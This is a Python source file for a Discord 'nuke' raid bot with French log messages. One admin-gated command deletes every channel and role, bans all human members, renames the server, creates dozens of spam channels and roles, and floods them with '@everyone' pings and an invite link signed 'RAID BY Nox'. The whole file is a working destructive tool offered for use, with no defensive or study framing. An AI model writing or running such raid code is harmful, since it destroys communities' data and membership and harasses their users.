import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        print("Pas les permissions.")
        return

    guild = ctx.guild

    async def delete_channels():
        await asyncio.gather(*[channel.delete() for channel in guild.channels if channel.type != discord.ChannelType.category])

    async def delete_roles():
        await asyncio.gather(*[role.delete() for role in guild.roles if role.name != "@everyone"])

    async def create_channels_and_spam():
        tasks = []
        for _ in range(50):
            channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
            for _ in range(5):
                tasks.append(channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone"))
        await asyncio.gather(*tasks)

    async def rename_server():
        try:
            await guild.edit(name="☠️ RAID BY Nox ☠️")
        except:
            pass

    async def create_roles():
        await asyncio.gather(*[
            guild.create_role(name="☠️ RAID BY Nox ☠️")
            for _ in range(30)
        ])

    async def ban_members():
        await asyncio.gather(*[
            member.ban(reason="RAID BY Nox")
            for member in guild.members if not member.bot
        ])

    try:
        await asyncio.gather(
            delete_channels(),
            delete_roles()
        )
        await asyncio.gather(
            create_channels_and_spam(),
            rename_server(),
            create_roles(),
            ban_members()
        )
        print("Nuke terminé.")
    except Exception as e:
        print(f"Erreur : {str(e)}")

bot.run(os.getenv("TOKEN"))
